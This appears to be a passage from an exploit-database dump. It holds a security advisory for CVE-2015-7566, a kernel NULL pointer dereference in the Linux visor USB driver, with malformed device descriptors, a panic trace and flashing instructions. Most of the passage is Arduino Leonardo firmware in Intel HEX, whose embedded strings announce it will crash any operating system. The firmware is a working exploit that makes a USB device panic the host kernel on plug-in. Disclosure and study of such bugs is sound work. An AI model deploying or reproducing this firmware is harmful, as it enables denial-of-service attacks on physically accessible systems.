:1006200084BD0895809190008F7707C080919000DD
:100630008F7D03C080919000877F80939000089504
:100640008091C0008F7703C08091C0008F7D809320
:10065000C00008958091C200877F8093C2000895F2
:10066000CF93DF9390E0FC01EA51FF4F2491FC010E
:10067000EC5FFE4F8491882349F190E0880F991F29
:10068000FC01E25CFE4FA591B491805D9E4FFC01A0
:10069000C591D4919FB7611108C0F8948C912095B1
:1006A00082238C93888182230AC0623051F4F894AB
:1006B0008C91322F309583238C938881822B888371
:1006C00004C0F8948C91822B8C939FBFDF91CF91C3
:1006D00008950F931F93CF93DF931F92CDB7DEB78B
:1006E000282F30E0F901E853FF4F8491F901EA51D6
:1006F000FF4F1491F901EC5FFE4F04910023C9F004
:10070000882321F069830E94F7026981E02FF0E0DD
:10071000EE0FFF1FE05DFE4FA591B4919FB7F894D7
:100720008C91611103C01095812301C0812B8C93A2
:100730009FBF0F90DF91CF911F910F910895CF939D
:10074000DF93282F30E0F901E853FF4F8491F9013E
:10075000EA51FF4FD491F901EC5FFE4FC491CC23D5
:1007600091F081110E94F702EC2FF0E0EE0FFF1FD5
:10077000EE5DFE4FA591B4912C912D2381E090E088
:1007800021F480E002C080E090E0DF91CF910895F5
:10079000615030F02091F100FC0120830196F8CFE8
:1007A000289884E680937D0508951092E9001092C0
:1007B00071051092700590936F0580936E050895F2
:1007C000FF920F931F93CF93DF93F82E8B01EA01D3
:1007D000BA01C8010E94A606F80120E030E08EEFC1
:1007E0002C173D0791F1F7FE02C0A49101C0A08132
:1007F000609170057091710540916E0550916F0583
:1008000064177507ACF49091E8009570E1F390914E
:10081000E80092FD1CC0A093F100A0917005B0917A
:1008200071051196AF73BB27AB2B11F48093E800D1
:10083000A0917005B09171051196B0937105A093C8
:1008400070052F5F3F4F3196CBCFC90102C08FEFAC
:100850009FEFDF91CF911F910F91FF9008951F920D
:100860000F920FB60F9211246F927F928F929F92E8
:10087000AF92BF92CF92DF92EF92FF920F931F93AE
:100880002F933F934F935F936F937F938F939F9398
:10089000AF93BF93EF93FF93CF93DF93CDB7DEB7C3
:1008A0006297DEBFCDBF1092E9008091E80083FF20
:1008B00046C168E0CE010A960E94C80382EF809389
:1008C000E8009A8597FF05C08091E80080FFFCCF83
:1008D00003C08EEF8093E800892F807609F023C152
:1008E0008B85811105C01092F1001092F10020C19A
:1008F000282F2D7F213009F41BC1853049F48091C8
:10090000E80080FFFCCF8C8580688093E30010C1F5
:10091000863009F0E1C02D8508891989223009F057
:10092000B3C0EC848E2D90E0209173053091740556
:10093000821793070CF09FC00E94D5031F92EF927D
:100940008DE394E09F938F930E9483068CE0E89E52
:1009500070011124E0917505F0917605EE0DFF1DF3
:1009600089E0DE01119601900D928A95E1F7C801A8
:100970000E94D50349E050E0BE016F5F7F4F80E0E9
:100980000E94E0030F900F900F900F90C12CD12C7C
:10099000612C712C33E7A32E34E0B32E4AEA842E67
:1009A00044E0942EE0917505F0917605EE0DFF1D63
:1009B000818590E0681679060CF0BAC07F926F923C
:1009C000BF92AF920E948306E0917505F091760583
:1009D000EE0DFF1D628573856C0D7D1D49E050E0B5
:1009E00080E00E94E0030F900F900F900F9000E0C6
:1009F00010E0E0917505F0917605EE0DFF1D028483
:100A0000F385E02DEC0DFD1D818590E00817190799
:100A10005CF51F930F939F928F920E948306E09143
:100A20007505F0917605EE0DFF1D0284F385E02D2E
:100A3000EC0DFD1DC801880F991FA485B585A80F71
:100A4000B91F4D915C910284F385E02DE80FF91FE9
:100A50006081718180E00E94E0030F5F1F4F0F9063
:100A60000F900F900F90C5CF8FEF681A780A8EE025
:100A7000C80ED11C97CF8FED94E09F938F930E9467
:100A800083060F900F9058C0C8012A8B0E94D5038F
:100A90002A892130C1F0233009F04EC08C851F9285
:100AA0008F9389EF94E09F938F930E94830642E097
:100AB00050E062E871E080E00E94E0030F900F9048
:100AC0000F900F9035C04091000150E060E071E060
:100AD00080E00E94E0032CC0873071F1883021F45F
:100AE00081E08093F10024C0893011F5937021F5E5
:100AF000EDE4F1E081E021E096E38093E9002093CA
:100B0000EB0034913093EC009093ED008F5F3196C1
:100B1000843099F78EE78093EA001092EA008C8582
:100B20008093720505C0888999890E94D50304C005
:100B30008EEF8093E80003C081E28093EB00629621
:100B40000FB6F894DEBF0FBECDBFDF91CF91FF91FE
:100B5000EF91BF91AF919F918F917F916F915F9135
:100B60004F913F912F911F910F91FF90EF90DF9048
:100B7000CF90BF90AF909F908F907F906F900F908D
:100B80000FBE0F901F9018951F920F920FB60F92E5
:100B900011248F939F938091E1001092E10083FFD5
:100BA0000FC01092E90091E09093EB001092EC00DE
:100BB00092E39093ED001092720598E09093F0000C
:100BC00082FF1AC080917E05882339F080917E05CE
:100BD000815080937E05882369F080917D0588236C
:100BE00059F080917D05815080937D05811104C06D
:100BF000289A02C05D9AF1CF9F918F910F900FBEFE
:100C00000F901F901895CF93DF93CDB7DEB782E199
:100C1000FE013596A0E0B1E001900D928A95E1F7D2
:100C20008F89988D9093760580937505898D9A8D1F
:100C300090937405809373058B8D9C8D90937C05A8
:100C400080937B058D8D9E8D90937A058093790599
:100C50008F8D98A1909378058093770510927205F7
:100C600081E08093D70080EA8093D80082E189BD3B
:100C700009B400FEFDCF61E070E080E090E00E94EA
:100C80007B0280E98093D8008CE08093E200109290
:100C9000E000559A209ADF91CF91089581E08093EA
:100CA000E00008959091C80095FFFCCF8093CE009E
:100CB00008951092CD0087E68093CC0088E1809360
:100CC000C9008EE08093CA0008950F931F93CF93BD
:100CD000DF93EC018C01FE0101900020E9F73197D0
:100CE000EC1BFD0BC8018C1B9D0B8E179F0730F46E
:100CF000F80181918F010E945206EDCFDF91CF91D3
:100D00001F910F910895CF93DF93CDB7DEB7DA959A
:100D10000FB6F894DEBF0FBECDBFFE01EB5FFE4FF6
:100D2000419151919F0160E071E0CE0101960E94D6
:100D30000707CE0101960E946506D3950FB6F89479
:100D4000DEBF0FBECDBFDF91CF9108958F929F92EE
:100D5000AF92BF92CF92DF92EF92FF920F931F93C9
:100D6000CF93DF9300D0CDB7DEB75B0122E535E04E
:100D70003F932F9389839A830E9483068981882ECB
:100D80009A81992E0F900F9000E010E08EE5E82EEA
:100D900085E0F82E91E1C92E94E0D92E0A151B05A5
:100DA000E4F4F40181914F0190E09F938F93FF92BF
:100DB000EF920E9483060F5F1F4FC8018F70992723
:100DC0000F900F900F900F90892B41F7DF92CF92E9
:100DD0000E9483060F900F90E1CF81E194E09F93F2
:100DE0008F930E9483060F900F900F900F90DF91CA
:100DF000CF911F910F91FF90EF90DF90CF90BF9018
:100E0000AF909F908F900895F8940C94E809AEE00D
:100E1000B0E0EDE0F7E00C94BF098C01CA0146E0B8
:100E20004C831A83098377FF02C060E070E8615049
:100E300071097E836D83A901BC01CE0101960E94D8
:100E400033074D815E8157FD0AC02F8138854217D7
:100E500053070CF49A01F801E20FF31F10822E964B
:100E6000E4E00C94DB09ACE0B0E0E9E3F7E00C94DB
:100E7000B1097C016B018A01FC0117821682838112
:100E800081FFBDC1CE0101964C01F7019381F601AE
:100E900093FD859193FF81916F01882309F4ABC184
:100EA000853239F493FD859193FF81916F018532ED
:100EB00029F4B70190E00E941B09E7CF512C312C97
:100EC00020E02032A0F48B3269F030F4803259F007
:100ED000833269F420612CC08D3239F0803339F4CB
:100EE000216026C02260246023C0286021C027FD25
:100EF00027C030ED380F3A3078F426FF06C0FAE00C
:100F00005F9E300D1124532E13C08AE0389E300DA1
:100F10001124332E20620CC08E3221F426FD6BC1C9
:100F2000206406C08C3611F4206802C0883641F473
:100F3000F60193FD859193FF81916F018111C1CFDE
:100F4000982F9F7D9554933028F40C5F1F4FFFE33B
:100F5000F9830DC0833631F0833771F0833509F0A2
:100F60005BC022C0F801808189830E5F1F4F44243B
:100F70004394512C540115C03801F2E06F0E711CDE
:100F8000F801A080B18026FF03C0652D70E002C08B
:100F90006FEF7FEFC5012C870E9410092C018301A0
:100FA0002C852F77222E17C03801F2E06F0E711CAE
:100FB000F801A080B18026FF03C0652D70E002C05B
:100FC0006FEF7FEFC5012C870E9405092C012C854E
:100FD0002068222E830123FC1BC0832D90E048163D
:100FE0005906B0F4B70180E290E00E941B093A94E0
:100FF000F4CFF50127FC859127FE81915F01B701B0
:1010000090E00E941B0931103A94F1E04F1A510808
:101010004114510471F7E5C0843611F0893639F571
:10102000F80127FF07C060817181828193810C5F85
:101030001F4F08C060817181882777FD8095982FA8
:101040000E5F1F4F2F76B22E97FF09C090958095A7
:10105000709561957F4F8F4F9F4F2068B22E2AE089
:1010600030E0A4010E944D09A82EA81844C085377D
:1010700029F42F7EB22E2AE030E025C0F22FF97F2E
:10108000BF2E8F36C1F018F4883579F0B4C08037A0
:1010900019F0883721F0AFC02F2F2061B22EB4FE97
:1010A0000DC08B2D8460B82E09C024FF0AC09F2F6D
:1010B0009660B92E06C028E030E005C020E130E09F
:1010C00002C020E132E0F801B7FE07C06081718103
:1010D000828193810C5F1F4F06C06081718180E027
:1010E00090E00E5F1F4FA4010E944D09A82EA81882
:1010F000FB2DFF77BF2EB6FE0BC02B2D2E7FA51428
:1011000050F4B4FE0AC0B2FC08C02B2D2E7E05C0E0
:101110007A2C2B2D03C07A2C01C0752C24FF0DC016
:10112000FE01EA0DF11D8081803311F4297E09C092
:1011300022FF06C07394739404C0822F867809F04E
:10114000739423FD13C020FF06C05A2C731418F4A7
:10115000530C5718732C731468F4B70180E290E0B5
:101160002C870E941B0973942C85F5CF731410F4FF
:10117000371801C0312C24FF12C0B70180E390E082
:101180002C870E941B092C8522FF17C021FF03C05A
:1011900088E590E002C088E790E0B7010CC0822F9C
:1011A000867859F021FD02C080E201C08BE227FD64
:1011B0008DE2B70190E00E941B09A51438F4B70135
:1011C00080E390E00E941B095A94F7CFAA94F4019F
:1011D000EA0DF11D8081B70190E00E941B09A1106A
:1011E000F5CF332009F451CEB70180E290E00E94A0
:1011F0001B093A94F6CFF7018681978102C08FEFE1
:101200009FEF2C96E2E10C94CD09FC010590615012
:1012100070400110D8F7809590958E0F9F1F08950C
:10122000FC016150704001900110D8F780959095B5
:101230008E0F9F1F08950F931F93CF93DF93182F47
:10124000092FEB018B8181FD03C08FEF9FEF20C041
:1012500082FF10C04E815F812C813D814217530770
:101260007CF4E881F9819F012F5F3F4F3983288308
:10127000108306C0E885F985812F0995892B29F708
:101280002E813F812F5F3F4F3F832E83812F902FF1
:10129000DF91CF911F910F910895FA01AA2728306D
:1012A00051F1203181F1E8946F936E7F6E5F7F4F33
:1012B0008F4F9F4FAF4FB1E03ED0B4E03CD0670FAF
:1012C000781F891F9A1FA11D680F791F8A1F911D02
:1012D000A11D6A0F711D811D911DA11D20D009F452
:1012E00068943F912AE0269F11243019305D319394
:1012F000DEF6CF010895462F4770405D4193B3E07D
:101300000FD0C9F7F6CF462F4F70405D4A3318F023
:10131000495D31FD4052419302D0A9F7EACFB4E0D4
:10132000A6959795879577956795BA95C9F700978C
:101330006105710508959B01AC010A2E069457952D
:10134000479537952795BA95C9F7620F731F841F84
:10135000951FA01D0895EE0FFF1F0590F491E02D3D
:1013600009942F923F924F925F926F927F928F9249
:101370009F92AF92BF92CF92DF92EF92FF920F9324
:101380001F93CF93DF93CDB7DEB7CA1BDB0B0FB62E
:10139000F894DEBF0FBECDBF09942A8839884888EB
:1013A0005F846E847D848C849B84AA84B984C88481
:1013B000DF80EE80FD800C811B81AA81B981CE0F78
:1013C000D11D0FB6F894DEBF0FBECDBFED0108955D
:0413D000F894FFCFBF
:1013D4001201000200000040AD0BEFBE000101024B
:1013E4000001220342006100640020004200410029
:1013F40042004500250078002500780025006E0095
:1014040025007000180342004100440020004300FE
:10141400300046004600450045002100120100024C
:10142400000000402D08000200010102030109022E
:10143400270001010000FA0705810304040C0705D5
:10144400010204000C0705820104000C07000700D8
:101454000700480100500072006F006C00690066CC
:101464000069006300000A550000006BFD180A00C3
:10147400809F0AB901312B940A8101128946001315
:10148400000257028B0A5E0AF80A5F01F212010099
:1014940002010000400D055702000101020301B9D9
:1014A4000A0100F80A5F0A810A220342006100640B
:1014B400002000420041004200450025007800253C
:1014C40000780025006E00250070001803420041DA
:1014D400004400200043003000460046004500451B
:1014E40000210012010002010000400D0557020016
:1014F400010102030109040000030100000003F2DA
:101504000AEC0A0902270001010000FA01AB0A09EA
:101514000400000301000000090200202020202014
:101524005F5F5F5F5F5F5F5F2020202020202020BF
:1015340020202020202020202020202020202020A7
:1015440020205F5F5F5F5F205F5F20205F2020209F
:101554002020205F5F0A0D00202020202F205F5FC5
:101564005F5F2F202F5F20205F5F5F5F205F5F5FE3
:101574005F5F20205F5F5F5F5F20202020202F209F
:101584005F5F5F2F2F202F5F285F295F5F5F5F2FD3
:10159400202F5F5F0A0D002020202F202F202020E5
:1015A4002F205F5F205C2F205F5F20602F205F5F14
:1015B400205C2F205F5F5F2F5F5F5F5F205C5F5F5A
:1015C400205C2F205F5F2F202F205F5F5F2F202F55
:1015D4002F5F2F0A0D0020202F202F5F5F5F2F2009
:1015E4002F202F202F202F5F2F202F202F5F2F2001
:1015F400285F5F2020292F5F5F5F2F205F5F2F20F0
:101604002F202F5F2F202F202F5F5F2F202C3C0AAD
:101614000D0020205C5F5F5F5F2F5F2F202F5F2F07
:101624005C5F5F2C5F2F5C5F5F5F5F2F5F5F5F5F5F
:101634002F20202020202F5F5F5F5F2F5C5F5F2FB4
:101644005F2F5C5F5F5F2F5F2F7C5F7C0A0D002044
:101654003C3C2043485241534820414E59204F506E
:1016640045524154494E472053595354454D203E09
:101674003E0A0D00203C3C202863292053657267F4
:10168400656A20536368756D696C6F20323031353B
:101694002C204F70656E536F7572636520536563BC
:1016A40075726974792052616C66205370656E6E30
:1016B4006562657267203E3E0A0D000A3E3E205078
:1016C4007265737320627574746F6E20746F207307
:1016D4007461727420657865637574696F6E2E2EFB
:1016E4002E0A0D005B44454255475D2045786563ED
:1016F400757465207061796C6F616420300A0D0027
:10170400526563762D446174613A0A0D005B444569
:101714004255475D200953656E6420436F6E6669C8
:101724006775726174696F6E44657363726970740E
:101734006F720928696E6465783A2569292E2E2E00
:101744000D0A005B44454255475D200953656E64AC
:1017540020496E74657266616365204465736372C3
:101764006970746F720928696E7465726661636565
:101774003A2569292E2E2E0D0A005B444542554711
:101784005D200953656E6420456E64706F696E74E4
:101794002044657363726970746F720928656E649E
:1017A400706F696E743A2569292E2E2E0D0A005B1E
:1017B40044454255475D203C3C70616E6963206D31
:1017C4006F64653F3E3E0D0A005B44454255475DEC
:1017D4002009203E3E20537472696E67204465736D
:1017E40063726970746F72207265717565737420A9
:1017F4002D2073656E64696E67206D616C666F720F
:101804006D656420737472696E67212073657475E5
:10181400702E7756616C75654C203D3D2025690D11
:101824000A005B48455844554D505D0A0D0025306B
:041834003258200006
:00000001FF"
3323,OS-S 2016-09 Linux visor clie_5_attach Nullpointer Dereference CVE-2015-7566,,CVE-2015-7566,"OS-S Security Advisory 2016-09
Linux visor clie_5_attach Nullpointer Dereference
Date: March 4th, 2016
Authors: Sergej Schumilo, Hendrik Schwartke, Ralf Spenneberg
CVE: CVE-2015-7566
CVSS: 4.9 (AV:L/AC:L/Au:N/C:N/I:N/A:C)
Title: Local RedHat Enterprise Linux DoS – RHEL 7.1 Kernel crashes on invalid
USB device descriptors (visor clie_5_attach driver)
Severity: Critical. The Kernel panics. A reboot is required.
Ease of Exploitation: Trivial
Vulnerability type: Wrong input validation
Products: RHEL 7.1 including all updates
Kernel-Version: 3.10.0-229.20.1.el7.x86_64 (for debugging-purposes we used the
CentOS Kernel kernel-debuginfo-3.10.0-229.14.1.el7)
Vendor: Red Hat
Vendor contacted: November, 12th 2015
PDF of advisory: https://os-s.net/advisories/OSS-2016-09_visor_clie_5_attach.pdf
Abstract:
The Kernel 3.10.0-229.20.1.el7.x86_64 crashes on presentation of a buggy USB
device requiring the visor (clie_5_attach) driver.
Detailed product description:
We confirmed the bug on the following system:
RHEL 7.1
Kernel 3.10.0-229.20.1.el7.x86_64
Further products or kernel versions have not been tested.
How reproducible: Always
Actual results: Kernel crashes.
Description:
The bug was found using the USB-fuzzing framework vUSBf from Sergej Schumilo
(github.com/schumilo) using the following device descriptor:
[*] Device-Descriptor
bLength: 0x12
bDescriptorType: 0x1
bcdUSB: 0x200
bDeviceClass: 0x3
bDeviceSubClass: 0x0
bDeviceProtocol: 0x0
bMaxPacketSize: 0x40
idVendor: 0x54c
idProduct: 0x144
bcdDevice: 0x100
iManufacturer: 0x1
iProduct: 0x2
iSerialNumbers: 0x3
bNumConfigurations: 0x1
The clie_5_attach function of the visor driver, which is called during the
driver initialization process, expects an OUT-Bulk-Endpoint.
Due to an incomplete sanity check, the visor driver tries to dereference null-
pointers.
This results in a crash of the system.
****
$ nm visor.ko.debug | grep clie_5_attach
0000000000000030 t clie_5_attach
$ addr2line -e visor.ko.debug 6d
/usr/src/debug/kernel-3.10.0-229.14.1.el7/linux-3.10.0-229.14.1.el7.x86_64/drivers/usb/serial/visor.c:610
****
**** CentOS-Kernel linux-3.10.0-229.14.1.el7 (drivers/usb/serial/visor.c)
...
607
608 pipe = usb_sndbulkpipe(serial->dev, port->bulk_out_endpointAddress);
609 for (j = 0; j < ARRAY_SIZE(port->write_urbs); ++j)
610 port->write_urbs[j]->pipe = pipe; /* if there is no configured OUT-
bulk-endpoint, the kernel tries to dereference null-pointers */
611
612 return 0;
613 }
...
****
[*] Configuration-Descriptor
bLength: 0x9
bDescriptorType: 0x2
wTotalLength: 0x27
bNumInterfaces: 0x1
bConfigurationValue: 0x1
iConfiguration: 0x0
bmAttributes: 0x0
bMaxPower: 0x31
[*] Interface-Descriptor
bLength: 0x9
bDescriptorType: 0x4
bInterfaceNumber: 0x0
bAlternateSetting: 0x0
bNumEndpoints: 0x3
bInterfaceClass: 0x0
bInterfaceSubClass: 0x0
bInterfaceProtocol: 0x0
[*] Endpoint-Descriptor:
bLength: 0x7
bDescriptorType: 0x5
bEndpointAddress: 0x81  IN-Direction
bmAttribut: 0x1  ISO-Transfer
wMaxPacketSize: 0x404
bInterval: 0xc
[*] Endpoint-Descriptor:
bLength: 0x7
bDescriptorType: 0x5
bEndpointAddress: 0x1 OUT-Direction
bmAttribut: 0x1 ISO-Transfer (change this
value to 0x2, which is the value for bulk-transfer without additional
features, and the visor driver won't crash)
wMaxPacketSize: 0x4
bInterval: 0xc
[*] Endpoint-Descriptor:
bLength: 0x7
bDescriptorType: 0x5
bEndpointAddress: 0x82 IN-Direction
bmAttribut: 0x1 ISO-Transfer
wMaxPacketSize: 0x4
bInterval: 0xc
Proof of Concept:
For a proof of concept, we are providing an Arduino Leonardo firmware file. This
firmware will emulate the defective USB device.
avrdude -v -p ATMEGA32u4 -c avr109 -P /dev/ttyACM0 -b 57600 -U
flash:w:binary.hex
The firmware has been attached to this bug report.
To prevent the automated delivery of the payload, a jumper may be used to
connect port D3 and 3V3!
Severity and Ease of Exploitation:
The vulnerability can be easily exploited. Using our Arduino Leonardo firmware,
only physical access to the system is required.
Vendor Communication:
We contacted Red Hat on the November, 12th 2015.
This bug was fixed upstream. A CVE number was not assigned.
References:
https://bugzilla.redhat.com/show_bug.cgi?id=1283371
http://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=cb3232138e37129e88240a98a1d2aba2187ff57c
Kernel Stacktrace:
[ 34.568077] usb 1-1: new full-speed USB device number 2 using xhci_hcd
[ 34.791731] usb 1-1: New USB device found, idVendor=054c, idProduct=0144
[ 34.795463] usb 1-1: New USB device strings: Mfr=1, Product=2,
SerialNumber=3
[ 34.799619] usb 1-1: Product: ĉ
[ 34.804592] usb 1-1: Manufacturer: ĉ
[ 34.810144] usb 1-1: SerialNumber: %
[ 34.872285] usbcore: registered new interface driver visor
[ 34.879838] usbserial: USB Serial support registered for Handspring Visor /
Palm OS
[ 34.890481] usbserial: USB Serial support registered for Sony Clie 5.0
[ 34.897769] usbserial: USB Serial support registered for Sony Clie 3.5
[ 34.914162] visor 1-1:1.0: Sony Clie 5.0 converter detected
[ 34.920288] BUG: unable to handle kernel NULL pointer dereference at
0000000000000058
[ 34.921136] IP: [<ffffffffa039306d>] clie_5_attach+0x3d/0x60 [visor]
[ 34.921136] PGD 0
[ 34.921136] Oops: 0002 [#1] SMP
[ 34.921136] Modules linked in: visor(+) ip6t_rpfilter ip6t_REJECT ipt_REJECT
xt_conntrack ebtable_nat ebtable_broute bridge stp llc ebtable_filter ebtables
ip6table_nat nf_conntrack_ipv6 nf_defrag_ipv6 nf_nat_ipv6 ip6table_mangle
ip6table_security ip6table_raw ip6table_filter ip6_tables iptable_nat
nf_conntrack_ipv4 nf_defrag_ipv4 nf_nat_ipv4 nf_nat nf_conntrack
iptable_mangle iptable_security iptable_raw iptable_filter ip_tables bochs_drm
ppdev syscopyarea sysfillrect sysimgblt ttm drm_kms_helper drm pcspkr i2c_piix4
i2c_core serio_raw parport_pc parport xfs libcrc32c sd_mod sr_mod crc_t10dif
cdrom crct10dif_common ata_generic pata_acpi ata_piix libata e1000 floppy
dm_mirror dm_region_hash dm_log dm_mod
[ 34.921136] CPU: 0 PID: 2220 Comm: systemd-udevd Not tainted
3.10.0-229.14.1.el7.x86_64 #1
[ 34.921136] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS
rel-1.8.2-0-g33fbe13 by qemu-project.org 04/01/2014
[ 34.921136] task: ffff88000bcfa220 ti: ffff88000bd20000 task.ti: ffff88000bd20000
[ 34.921136] RIP: 0010:[<ffffffffa039306d>] [<ffffffffa039306d>]
clie_5_attach+0x3d/0x60 [visor]
[ 34.921136] RSP: 0018:ffff88000bd23a80 EFLAGS: 00010286
[ 34.921136] RAX: 00000000c0000200 RBX: ffff88000af979d0 RCX: 0000000000000000
[ 34.921136] RDX: ffff88000be6b000 RSI: ffff88000af979c0 RDI: ffff88000af979c0
[ 34.921136] RBP: ffff88000bd23a80 R08: 0000000000000000 R09: 0000000000000000
[ 34.921136] R10: 0000000000000000 R11: ffff88000c3b9800 R12: ffff88000af979d0
[ 34.921136] R13: ffff88000c525830 R14: ffff88000af979c0 R15: ffffffffa0395200
[ 34.921136] FS: 00007fb8082b4880(0000) GS:ffff88000fc00000(0000)
knlGS:0000000000000000
[ 34.921136] CS: 0010 DS: 0000 ES: 0000 CR0: 000000008005003b
[ 34.921136] CR2: 0000000000000058 CR3: 000000000d2a1000 CR4:
00000000000006f0
[ 34.921136] DR0: 0000000000000000 DR1: 0000000000000000 DR2:
0000000000000000
[ 34.921136] DR3: 0000000000000000 DR6: 00000000ffff0ff0 DR7: 0000000000000400
[ 34.921136] Stack:
[ 34.921136] ffff88000bd23c18 ffffffff8145fed1 0000000000000007 000000020bd23af8
[ 34.921136] ffff88000c525830 0000000000000000 0000000000000000 ffffffff00000000
[ 34.921136] ffff88000bcd0000 ffff880000000001 ffff88000bcd0090 0000000000000000
[ 34.921136] Call Trace:
[ 34.921136] [<ffffffff8145fed1>] usb_serial_probe+0xdb1/0x1230
[ 34.921136] [<ffffffff812d649c>] ? ida_get_new_above+0x7c/0x2a0
[ 34.921136] [<ffffffff811aba6a>] ? kmem_cache_alloc+0x1ba/0x1d0
[ 34.921136] [<ffffffff8123e5b2>] ? sysfs_addrm_finish+0x42/0xe0
[ 34.921136] [<ffffffff8123e391>] ? __sysfs_add_one+0x61/0x100
[ 34.921136] [<ffffffff8141dc04>] usb_probe_interface+0x1c4/0x2f0
[ 34.921136] [<ffffffff813d30d7>] driver_probe_device+0x87/0x390
[ 34.921136] [<ffffffff813d34b3>] __driver_attach+0x93/0xa0
[ 34.921136] [<ffffffff813d3420>] ? __device_attach+0x40/0x40
[ 34.921136] [<ffffffff813d0e43>] bus_for_each_dev+0x73/0xc0
[ 34.921136] [<ffffffff813d2b2e>] driver_attach+0x1e/0x20
[ 34.921136] [<ffffffff8145ec4b>] usb_serial_register_drivers+0x29b/0x580
[ 34.921136] [<ffffffffa0398000>] ? 0xffffffffa0397fff
[ 34.921136] [<ffffffffa039801e>] usb_serial_module_init+0x1e/0x1000 [visor]
[ 34.921136] [<ffffffff810020e8>] do_one_initcall+0xb8/0x230
[ 34.921136] [<ffffffff810dd0ee>] load_module+0x133e/0x1b40
[ 34.921136] [<ffffffff812f7d60>] ? ddebug_proc_write+0xf0/0xf0
[ 34.921136] [<ffffffff810d96b3>] ? copy_module_from_fd.isra.42+0x53/0x150
[ 34.921136] [<ffffffff810ddaa6>] SyS_finit_module+0xa6/0xd0
[ 34.921136] [<ffffffff81614389>] system_call_fastpath+0x16/0x1b
[ 34.921136] Code: 28 48 8b 57 20 0f b6 80 28 02 00 00 88 82 28 02 00 00 48
8b 0f c1 e0 0f 0d 00 00 00 c0 8b 09 c1 e1 08 09 c8 48 8b 8a 10 02 00 00 <89>
41 58 48 8b 92 18 02 00 00 89 42 58 31 c0 5d c3 66 90 b8 ff
[ 34.921136] RIP [<ffffffffa039306d>] clie_5_attach+0x3d/0x60 [visor]
[ 34.921136] RSP <ffff88000bd23a80>
[ 34.921136] CR2: 0000000000000058
[ 35.341720] ---[ end trace b239663354a1c556 ]---
[ 35.347341] Kernel panic - not syncing: Fatal exception
[ 35.348314] drm_kms_helper: panic occurred, switching back to text console
Arduino Leonardo Firmware:
:100000000C94A8000C94C5000C94C5000C94C50079
:100010000C94C5000C94C5000C94C5000C94C5004C
:100020000C94C5000C94C5000C94C4050C942F04CA
:100030000C94C5000C94C5000C94C5000C94C5002C
:100040000C94C5000C94C5000C94C5000C94C5001C
:100050000C94C5000C94C5000C94C5000C940E02C1
:100060000C94C5000C94C5000C94C5000C94C500FC
:100070000C94C5000C94C5000C94C5000C94C500EC
:100080000C94C5000C94C5000C94C5000C94C500DC
:100090000C94C5000C94C5000C94C5000C94C500CC
:1000A0000C94C5000C94C5000C94C5000B030E0302
:1000B000010305032F032F032F03120316031A0353
:1000C000200324032F032A030000000200080E006F
:1000D00000030401000B000000000000000000000D
:1000E00000000000000004080201104080401020C1
:1000F00040804080080204018040201002011080EE
:100100001020404004040404040304050202020217
:1001100004030202020206060606060604040202A0
:100120000204000000002300260029002C002F00FC
:1001300000000000250028002B002E0031000000E8
:100140000000240027002A002D00300000C180811B
:1001500011241FBECFEFDAE0DEBFCDBF15E0A0E077
:10016000B1E0E4EDF3E102C005900D92A436B107D1
:10017000D9F725E0A4E6B5E001C01D92AF37B2077C
:10018000E1F70E94C8000C9404070C940000089545
:10019000CF93DF93CDB7DEB7CD59D1090FB6F89421
:1001A000DEBF0FBECDBF0E94A1020E94C70060E06B
:1001B00083E00E94300361E087E00E94300361E049
:1001C00088E00E9430030E9459067E012AE9E20E6F
:1001D000F11C84E093E0D70111969C938E9389E003
:1001E00094E013969C938E93129782E2E2E1F1E001
:1001F0009E012F5F3F4F6901D90101900D928A95B1
:10020000E1F788E1E4E3F1E0DE01939601900D92DD
:100210008A95E1F782E1ECE4F1E0DE01DB96019002
:100220000D928A95E1F789E0EEE5F1E0DE01A05953
:10023000BF4F01900D928A95E1F72A593F4F99E0FF
:10024000992ED901E92D1D92EA95E9F78E010957FA
:100250001F4F87E0E7E6F1E0D80101900D928A9503
:10026000E1F7BE0160587F4F87E0EEE6F1E0DB0189
:1002700001900D928A95E1F7AE0147585F4F87E0F4
:10028000E5E7F1E0DA0101900D928A95E1F75E0170
:10029000FEE8AF0EB11C86E0ECE7F1E0D50101907D
:1002A0000D928A95E1F7CE01835B9F4FEEE0DC0172
:1002B0001D92EA95E9F7E3E0DC011996EC93D90188
:1002C0009C92F4E01196FC9311971496EC93F9012B
:1002D000DC01292D01900D922A95E1F7FE01EC56E3
:1002E000FF4FDC011B96FC93EE931A971D96BC9270
:1002F000AE921C971183008373836283558344837A
:100300000C5211092CE0F80111922A95E9F721E02D
:10031000D80119962C931997FE01E059FF4F0190CF
:100320000D929A94E1F7F8019387828761E088E063
:100330000E9469038BE492E00E94650688E892E0DF
:100340000E94650687EC92E00E94650686E093E0D5
:100350000E94650682E493E00E9465068FE793E0C1
:100360000E94650684EA93E00E9465068BEE93E0A6
:100370000E94650683E00E949F03892B09F047C015
:100380005E01F3E2AF0EB11C8824839482E1982EC3
:1003900084E194E00E946506BF92AF92DF92CF9213
:1003A000FF92EF921F928F921F930F932DB73EB73C
:1003B000225131090FB6F8943EBF0FBE2DBFADB725
:1003C000BEB71196FE01FB96892D01900D928A957C
:1003D000E1F78DE695E00E94030668E873E180E0AE
:1003E00090E00E947B028DE695E00E944E0660E060
:1003F00087E00E94690368E873E180E090E00E9472
:100400007B020FB6F894DEBF0FBECDBFC1CF6AE04E
:1004100070E080E090E00E947B02ACCF1F920F92D0
:100420000FB60F9211242F933F938F939F93AF9307
:10043000BF938091650590916605A0916705B09185
:1004400068053091640523E0230F2D3720F40196D1
:10045000A11DB11D05C026E8230F0296A11DB11DE7
:10046000209364058093650590936605A0936705C6
:10047000B09368058091690590916A05A0916B051C
:10048000B0916C050196A11DB11D809369059093F3
:100490006A05A0936B05B0936C05BF91AF919F91D6
:1004A0008F913F912F910F900FBE0F901F90189535
:1004B0003FB7F8948091690590916A05A0916B050A
:1004C000B0916C0526B5A89B05C02F3F19F0019689
:1004D000A11DB11D3FBF6627782F892F9A2F620F6C
:1004E000711D811D911D42E0660F771F881F991FA6
:1004F0004A95D1F70895CF92DF92EF92FF92CF9372
:10050000DF936B017C010E945802EB01C114D104FE
:10051000E104F10479F00E9458026C1B7D0B683EE7
:100520007340A0F381E0C81AD108E108F108C8516E
:10053000DC4FECCFDF91CF91FF90EF90DF90CF9029
:100540000895789484B5826084BD84B5816084BD4B
:1005500085B5826085BD85B5816085BDEEE6F0E03C
:10056000808181608083E1E8F0E010828081826098
:100570008083808181608083E0E8F0E08081816019
:100580008083E1E9F0E08081826080838081816006
